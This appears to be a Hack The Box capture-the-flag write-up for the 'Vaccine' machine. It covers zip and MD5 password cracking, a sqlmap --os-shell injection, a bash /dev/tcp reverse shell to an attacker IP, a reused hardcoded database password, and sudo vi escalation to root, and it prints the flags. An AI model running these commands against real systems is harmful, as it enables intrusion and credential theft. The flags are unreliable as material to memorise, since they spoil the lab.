# [HTB] Vaccine

## recon

- [nmap scan](./nmap.log)
	- cmd: `nmap -sC -sV -A -o nmap.log <Target-IP>`
	- p21, p22 & p80 are open
	- on p21 anonymous ftp login allowed

- found `backup.zip` in ftp, it is password protected

- p80 hosts a website, `MegaCrop Login` page

## hacking

- cracked zip file password using __john the ripper__
	- `zip2john backup.zip > backup_pwd.hash`
	- `john backup_pwd.hash -wordlist=/usr/share/wordlists/rockyou.txt`
	- `john --show backup_pwd.hash`
	- password: `741852963`

- unzipped the file
	- found `index.php` & `style.css`
	- found website login creds, but pwd is in _MD5 format_ (in `index.php`)
		- `admin:2cb42f8734ea607eefed3b70af13bbd3`
	- _password_:`qwerty789` ([crackstation](https://crackstation.net/))

- _logged in_ on `<IP>`'s website
	- redirected to `/dashboard.php`
	- found param `/dashboard.php?search=`

- using __sqlmap__
	- cmd: `sqlmap -u "http://<Target-IP>/dashboard.php?search=" --cookie="PHPSESSID=5naq63b4fai8cobfeikbacjc21" --os-shell --batch`
	- _got a shell on system!_

- currently we are `postgres` user
	- getting reverse shell
		- `nc -lvnp 4444` (_attacker's machine_)
		- `bash -c "bash -i >& /dev/tcp/<Attacker-IP>/4444 0>&1"` (_os shell_)
		- _successfully got reverse shell!_
	- __enumerating system__
		- found _user_:`simon`
		- found `/var/lib/postgresql/user.txt` > `ec9b13ca4d6229cd5cc1e09980965bf7`

- __privesc__
	- found sensitive infomation in `/var/www/html/dashboard.php`
		- `$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");`
	- using these creds, access machine using __ssh__
	- `sudo -l` > `/bin/vi /etc/postgresql/11/main/pg_hba.conf`
	- getting root shell
		- `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
		- `:shell`

- currently we are `root` user
	- found `/root/root.txt` > `dd6e058e814260bc70e9bbdef2715849`

